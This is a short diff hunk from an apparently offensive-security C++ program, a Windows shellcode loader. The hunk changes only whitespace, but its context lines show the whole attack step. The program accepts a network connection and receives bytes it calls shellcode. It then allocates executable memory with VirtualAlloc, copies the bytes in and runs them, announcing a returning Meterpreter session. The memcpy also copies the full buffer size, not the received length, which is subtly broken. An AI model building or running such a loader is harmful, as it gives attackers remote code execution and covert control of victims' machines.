@@ -116,19 +116,19 @@ int main()
 
 	clientSocket = accept(listenSocket, NULL, NULL);
 	std::cout << "Incoming connection..." << std::endl;
-	
+
 	receivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), NULL);
 	if (receivedBytes > 0) {
 		std::cout << "Received shellcode bytes " << receivedBytes << std::endl;
 	}
-	
+
 	LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	std::cout << "Allocated memory for shellocode at: " << shellcode << std::endl;
-	
+
 	memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));
 	std::cout << "Copied shellcode to: " << shellcode << std::endl << "Sending back meterpreter session...";
 	((void(*)()) shellcode)();
-	
+
 	return 0;
 }
 ```
